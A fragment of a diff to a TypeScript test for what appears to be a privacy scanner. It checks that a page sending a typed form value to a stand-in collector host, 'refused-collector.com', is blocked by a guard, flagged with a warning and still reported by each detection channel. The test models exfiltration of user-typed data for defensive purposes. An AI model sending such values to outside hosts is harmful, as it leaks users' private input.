+  // publish the page sending the value as a complete finding that it did not.
+  const refused = "refused-collector.com";
+  const visit = await scanTypedValueSink({ collector: refused, shieldsBlockingEnabled: true, refusedHost: refused });
+  assert.deepEqual(visit.received, { all: 0, sentinel: 0 }, "the guard refused the connection");
+  assert.equal(
+    visit.visit.result.warnings.some((warning) => warning.startsWith("Blocked a request that could not be verified as public")),
+    true
+  );
+  for (const wire of ["v1", "v1Report", "staged", "r2"] as const) {
+    assert.deepEqual(visit.recipients[wire], [refused], `${wire} names the host the page sent the value to`);
+  }
+  assert.equal(visit.r2Detector.status, "complete");
 });
 
 /**
